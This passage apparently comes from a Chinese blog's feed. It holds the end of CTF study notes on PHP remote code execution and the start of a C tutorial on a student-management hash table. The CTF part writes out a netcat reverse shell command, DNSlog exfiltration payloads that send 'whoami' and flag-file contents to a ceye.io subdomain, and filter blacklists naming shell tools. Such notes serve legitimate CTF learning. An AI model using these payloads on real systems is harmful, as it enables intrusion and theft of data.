invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">  <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">      &#125;&#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们看这道题过滤了很多字符</p><h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><p>无回显顾名思义没有回显的远程代码执行漏洞，那对于这种情况我们可以这样思考</p><h3 id="sleep函数测试"><a href="#sleep函数测试" class="headerlink" title="sleep函数测试"></a>sleep函数测试</h3><p>我们在无回显rce中可以使用sleep函数测试一下页面的回响，比如说我们这样写</p><p>:::warning<br>url?c&#x3D;ls;sleep 3</p><p>:::</p><p>http请求dns请求</p><p>:::warning<br><a href="http://ceye.io/payloads">http://ceye.io/payloads</a></p><p>:::</p><p>如果说我们在进行sleep测试的时候确实停了3秒，那么我们可以进行一下的一些思路。</p><h3 id="shell获取权限拿flag"><a href="#shell获取权限拿flag" class="headerlink" title="shell获取权限拿flag"></a>shell获取权限拿flag</h3><p>更具上面的sleep测试，首先页面无回显，那么我们就不能单纯的在进行我们上面的rce的bypass了，我们可以使用写shell的方式，但是这个shell可以是我们直接写的（echo shell&gt;xxxx.sh）也可以是我们下载的(wget）。</p><p>我们手写的话就是这样走：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?c=nc -e /bin/sh ip port</span><br></pre></td></tr></table></figure><p>:::warning<br>然后我们本地在使用nc进行监听。</p><p>:::</p><p>这样是一种拿到flag的一种思路。</p><h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><p>dnslog主要争对无回显的情况</p><ul><li>Sqi-Blind</li><li>RCE</li><li>SSRF</li><li>RFI(Remote File inclusion)</li></ul><p>但是我们这里只谈RCE的使用。</p><p>首先我们介绍一什么是dnslog。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><font style="color:rgb(77, 77, 77);">DNS在解析的时候会留下日志，我们将信息放在高级域名中，传递到自己这里，然后通过读日志获取信息。所以这里跟最初的猜想基本一致，原理也就是通过DNS请求后，通过读取日志来获取我们的请求信息。</font></p><p>我们用一个例子来理解这个东西：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt;ping %USERNAME%.ABsec.com</span><br><span class="line">ping 请求找不到主机 example.ABsec.como. ......</span><br></pre></td></tr></table></figure><p>我们可以看到我们这个ping的命令将example.ABsec.com一起发给了DNS服务器请求解析域名对应的ip地址，这个过程被记录下来就是DNSlog。也就是说，只要可以进行DNS请求，就有可能存在DNSlog注入。</p><p>DNSlog常规的Linux的注入是这个样子的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.exp.ceye.io/`<span class="built_in">whoami</span>`    //这里的exp.ceye.io就是我们identifier，这里的ip与port均为靶机的ip与port。命令而已自己尝试这换。</span><br><span class="line">ping `<span class="built_in">whoami</span>`.ip.port.exp.ceye.io</span><br></pre></td></tr></table></figure><h4 id="举例-fold"><a href="#举例-fold" class="headerlink" title="举例 %% fold %%"></a>举例 %% fold %%</h4><p>我们拿NSSCTF里面的一道题目举例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="variable">$cmd</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);      </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们看到上面代码，进行代码审计</p><p>首先是过滤了;,&amp;,$,x09,x26等关键字，而且还过滤的ping。</p><p>在url上面传入一个cmd参数。</p><p>再往下看，发现了shell_exec,那么基本可以判定是无回显RCE了。</p><p>那我们就可以试试使用DNSlog来进行渗透了。</p><p>我们需要用到下面的identifier，这个就是我们后面需要跟的那个域名。</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1709432007245-b996d729-494a-4013-8b3a-25c8fb8d7115.png?imageSlim"></p><p>那我们的payload这样写就可以了</p><p>:::warning<br>payload:url?cmd&#x3D;curl <code>cat /fla*</code>.域名</p><p>:::</p><p>我们这样写，然后运行，回到我们的ceye中查看flag。</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1709448249133-13c3155f-d753-4f50-827c-1cb0bc96cdfd.png?imageSlim"></p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a><font style="color:rgb(79, 79, 79);">无参数RCE</font></h2><p>我们判断一个题目是什么类型的话，需要看看他又什么特征，而无参数RCE的特这是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;     </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也有这样的:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>,<span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们解释一下这个ps1里面的if判断是什么意思：</p><p>这里说的是匹配了一个或者多个非标点符号字符来表示函数名，后面跟一个括号表示函数调用，里面的(?R)指的是只匹配和替换嵌套的函数调用，而不处理函数参数。</p><p>我们举一个例子：</p><p>:::warning<br>a();</p><p>a(b());</p><p>&#x2F;&#x2F;以上两个是可以的</p><p>a(‘xyz’);</p><p>&#x2F;&#x2F;这个时候不可以的</p><p>:::</p><p>而ps2的判断是这样的：</p><p>[a-z,_]：匹配小写字母与下划线</p><p>(?R)当前表达式一直递归，如果说我们的右括号后面接了一个?表示递归当前表达式0或1次。但是如果右括号后面跟的是*的话，则表示递归当前表达式0或多次（ps1也是一样的）。</p><p>了解这些之后，我们在看绕过的方法</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上就是我对于RCE学习的一个总结，其中也借鉴了很多网上大佬们的文章，也有视频学习的笔记。如果有不足，会很快改的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学生管理系统</title>
      <link href="/2026/01/23/%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2026/01/23/%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>这个是我写的一个学生管理系统的一个简介，这个系统的主要功能如下：</p><ol><li>添加学生信息</li><li>删除学生信息</li><li>显示所有学生信息</li><li>查询学生信息</li><li>修改学生信息</li></ol><p>用户可以通过输入的序号来使用对应的功能。</p><h1 id="系统框架设计："><a href="#系统框架设计：" class="headerlink" title="系统框架设计："></a>系统框架设计：</h1><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/yuque_diagram.jpg?imageSlim"></p><h1 id="核心数据结构"><a href="#核心数据结构" class="headerlink" title="核心数据结构"></a>核心数据结构</h1><h2 id="学生结构体"><a href="#学生结构体" class="headerlink" title="学生结构体"></a>学生结构体</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct <span class="title class_">Student</span> &#123;</span><br><span class="line">    char name[<span class="number">100</span>];         <span class="comment">// 姓名</span></span><br><span class="line">    int stuid;              <span class="comment">// 学号(唯一标识)</span></span><br><span class="line">    int age;                <span class="comment">// 年龄</span></span><br><span class="line">    char major[<span class="number">100</span>];        <span class="comment">// 专业</span></span><br><span class="line">    struct <span class="title class_">Student</span> *next;   <span class="comment">// 下一个节点指针</span></span><br><span class="line">&#125; <span class="title class_">Student</span>;</span><br></pre></td></tr></table></figure><p>设计思路：</p><ul><li>作为系统的基本数据单元</li><li>包含<code>next</code>指针形成链表结构</li><li><code>stuid</code>作为唯一标识符(键值)</li><li>使用固定大小数组简化内存管理</li></ul><h2 id="学生哈希表"><a href="#学生哈希表" class="headerlink" title="学生哈希表"></a>学生哈希表</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//学生数据库结构体</span></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    <span class="title class_">Student</span> *table[<span class="variable constant_">HASH_SIZE</span>];       <span class="comment">//哈希桶数组</span></span><br><span class="line">    <span class="title class_">Student</span> *head;      <span class="comment">// 链表头指针</span></span><br><span class="line">    int count;<span class="comment">//学生人数</span></span><br><span class="line">&#125; <span class="title class_">StudentDB</span>;</span><br></pre></td></tr></table></figure><p>设计思路：</p><ul><li>使用链地址法解决哈希冲突</li><li><code>table</code>数组存储每个桶的链表头</li><li><code>head</code>指向全局链表头部，便于遍历</li><li>固定大小哈希表简化实现</li></ul><h1 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化学生数据库</span></span><br><span class="line"><span class="title class_">StudentDB</span>* <span class="title function_">init_system</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">StudentDB</span> *db = <span class="title function_">malloc</span>(<span class="title function_">sizeof</span>(<span class="title class_">StudentDB</span>));</span><br><span class="line">    <span class="comment">//判断内存是否分配成功</span></span><br><span class="line">    <span class="keyword">if</span> (db == <span class="variable constant_">NULL</span>) &#123;</span><br><span class="line">        <span class="title function_">perror</span>(<span class="string">&quot;malloc_error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化hash_table</span></span><br><span class="line">    <span class="keyword">for</span> (int i =<span class="number">0</span>; i &lt; <span class="variable constant_">HASH_SIZE</span>; i++) &#123;</span><br><span class="line">        db-&gt;table[i] = <span class="variable constant_">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//让链表的头指针为NULL</span></span><br><span class="line">    db-&gt;head = <span class="variable constant_">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算学生人数</span></span><br><span class="line">    db-&gt;count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> db;      <span class="comment">//返回创建的数据库指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们跟踪看看效果：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/29467292/1750698317995-f75a42c2-f12b-4942-ad4a-58b4004b2588.png"></p><p>table 中的所有值也都变成了 NULL</p><p>**<font style="background-color:#FBDE28;"><br></font>*<em>这里的 StudentDB</em> init_system() 中的 StudentDB*是<font style="color:#DF2A3F;">返回类型</font>，表示这个函数是一个<font style="color:#DF2A3F;">指向 StudentDB 结构体的指针</font></p><p>init_system()是一个<font style="color:#DF2A3F;">函数名</font></p><p>我们分配内存给数据库结构，然后设置合理的初始值都为 NULL，最后返回指针供其他函数使用。</p><h2 id="添加学生信息"><a href="#添加学生信息" class="headerlink" title="添加学生信息"></a>添加学生信息</h2><p>原先思路，将我们输入的每一个学生都添加到一个文件中，文件名为 Student_information.txt</p><p>然后代码流程思路为：</p><p>输入学生的学号，姓名，年龄和专业，然后通过哈希表来存入，当我们现在存完之后，通过一个文件队哈希表进行读取存放就可以达到本地保存了。但是再哈希表部分我们需要做一个判断就是我们这个学号是否是唯一的。也就是说，我们再添加学生这里我们得有两个函数，一个是输入学生信息到哈希表中，还有一个是保存到文件中</p><h3 id="Add-stu"><a href="#Add-stu" class="headerlink" title="Add_stu()"></a>Add_stu()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Add_Stu</span><span class="params">(StudentDB *db, Student *stu)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = stu-&gt;stuid % HASH_SIZE;          <span class="comment">//计算哈希值</span></span><br><span class="line">    <span class="keyword">if</span> (db-&gt;buckets[hash] == <span class="literal">NULL</span>) &#123;            <span class="comment">//如果哈希桶为NULL,也就表示已经初始化成功了，直接插入</span></span><br><span class="line">        stu-&gt;next = db-&gt;buckets[hash];          <span class="comment">//将新学生节点的 next 指针指向当前桶中的链表头节点</span></span><br><span class="line">        db-&gt;buckets[hash] = stu;                <span class="comment">//将新学生节点作为当前桶中链表的头节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在链式哈希表中，我们通常不会直接把 stu-&gt;stuid 和 stu-&gt;name 赋值给 db-&gt;key 和 db-&gt;val，因为每个桶实际上是一个链表的起点，链表中的每个节点都保存着一个键值对（在这里是 stuid 和其他学生信息）。链式哈希表通过为每个桶维护一个链表来解决哈希冲突，允许多个键值对存储在同一个桶中。</p><p>我们现在只是将数据存储再哈希表中，但是我们再框架设计中提到，我们的增删改都是要通过链表来操作的，所以我们得把这份数据也传入给链表并且跟新人数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局链表头指针（头插法）</span></span><br><span class="line">stu-&gt;next = db-&gt;head;                       <span class="comment">//将新学生节点的 next 指针指向当前链表的头节点</span></span><br><span class="line">db-&gt;head = stu;                            <span class="comment">//将新学生节点作为当前链表的头节点</span></span><br><span class="line"><span class="comment">//更新学生人数计数</span></span><br><span class="line">db-&gt;count++;</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输入学生信息到文件里面</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *思路：我们输入学生信息，然后将其先保存到哈希表中，当我们本次的输入结束之后，我们再将他保存到文件中。</span></span><br><span class="line"><span class="comment"> *如果后续还有新的学生的话，我们直接再文件末尾做添加就可以了。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Add_Stu</span><span class="params">(StudentDB *db, Student *stu)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = stu-&gt;stuid % HASH_SIZE;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 桶内头插法（修复：不需要判断是否为NULL）</span></span><br><span class="line">    stu-&gt;next = db-&gt;buckets[hash];</span><br><span class="line">    db-&gt;buckets[hash] = stu;</span><br><span class="line">    </span><br><span class="line">    db-&gt;count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学生 %d 添加成功！\n&quot;</span>, stu-&gt;stuid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题：为什么我们的哈希表和链表是共享的同一份数据还是把同一份输入，保存在两个部分，一部分用于快速查询，一部分用于增删改？</p><blockquote><p>学生信息是在内存中通过指针建立了两种不同的组织结构：一种是以哈希表为基础，用于快速查找；另一种是以全局链表为基础，用于整体遍历。这两种结构共享同一批学生数据节点，从不同角度组织这些数据，以满足不同场景下的操作需求。</p></blockquote><p>现在我们可以来写第二部分的代码了，将学生信息保存到文件中，用于本地保存。</p><h3 id="save-students-to-file"><a href="#save-students-to-file" class="headerlink" title="save_students_to_file()"></a>save_students_to_file()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将学生信息保存到文件</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_students_to_file</span><span class="params">(StudentDB *db)</span> &#123;</span><br><span class="line">    FILE *file = fopen(STUDENT_INFORMATION, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;无法打开文件&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HASH_SIZE; i++) &#123;</span><br><span class="line">        Student *current = db-&gt;buckets[i];</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(file, <span class="string">&quot;%d,%s,%d,%s\n&quot;</span>, current-&gt;stuid, current-&gt;name, current-&gt;age, current-&gt;major);</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学生信息已保存到文件！\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查找学生信息"><a href="#查找学生信息" class="headerlink" title="查找学生信息"></a>查找学生信息</h2><p>思路：查询模块应该有分为两种情况</p><ol><li><p>我刚添加完数据，所有的数据都还在内存中，我可以直接通过哈希表来通过键值对查询 </p></li><li><p>我添加完了数据，但是我退出了程序，内存中已经没有原来的数据了，我需要从文件中读取源数据，然后再做查询，这个时候应该可以通过链表或者其他思路来做。</p></li></ol><p>也就是说我们这个函数需要再写两个情况函数，query_in_memory()和Load_From_File()</p><h3 id="query-in-memory"><a href="#query-in-memory" class="headerlink" title="query_in_memory"></a>query_in_memory</h3><p>我们先来写一下 query_in_memory 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Student* <span class="title function_">Search_query_in_memory</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = stuid % HASH_SIZE;</span><br><span class="line">    Student *current = db-&gt;buckets[hash];</span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;stuid == stuid) &#123;</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们是计算哈希值，然后我们要从哈希表对应的桶中取出链表头指针，指针指向链表的第一个节点。然后我们需要判断我们当前的这个学号是否是我们要查询的学号，如果不是就跳到下一个节点。如果全部遍历完了都没有找到，则说明没有要查询的学号。</p><h3 id="search-student-in-file"><a href="#search-student-in-file" class="headerlink" title="search_student_in_file()"></a>search_student_in_file()</h3><p>再来看看加载文件的思路是什么</p><p>首先我们要打开这个文件（fopen），然后判断我们这个文件是否是空的，非空的话我们就可以定义一个数组来保存每一行的学生信息了。我们将文件中的东西，逐行加载到哈希表中（fget），并且确保每次读取到的东西不超过缓存区的大小（避免缓冲区溢出）。创建一个实列用来保存数据（newstudent）并且动态分配内存，然后通过判断来看看我们输入的信息是否有 4 个信息（学号，名字，年龄，专业），满足则调用 Add_Stu()， 如果不满足则释放我们刚刚开辟的空间。最后读取完了就可以关闭这个文件了（fclose）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从文件加载学生信息到内存中的哈希表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Load_From_File</span><span class="params">(StudentDB *db,<span class="type">const</span> <span class="type">char</span> *filename)</span> &#123;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;Student_information.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];                     <span class="comment">//定义一个字符数组，用于存储每一行的内容</span></span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), file)) &#123;</span><br><span class="line">        Student *newStudent = (Student *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Student));</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%d,%[^,],%d,%[^,]&quot;</span>, &amp;newStudent-&gt;stuid, newStudent-&gt;name, &amp;newStudent-&gt;age, newStudent-&gt;major) == <span class="number">4</span>)</span><br><span class="line">        <span class="comment">//这里的name和major是数组，他们本身就是地址，所以不需要取地址符</span></span><br><span class="line">        &#123;</span><br><span class="line">            Add_Stu(db, newStudent);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">free</span>(newStudent);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Search-Stu"><a href="#Search-Stu" class="headerlink" title="Search_Stu()"></a>Search_Stu()</h3><p>ok 现在我们两个情况的代码都完成了，我们现在就可以来写最后的 search 模块了</p><p>模块思路：</p><p>因为用户添加完数据之后，可能习惯性直接就查询我们的用户有没有添加成功，所以可能添加完用户之后没有退出程序，我们就先看看能不能在内存中找到数据，没有的话在从文件中读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//综合查询</span></span><br><span class="line">Student* <span class="title 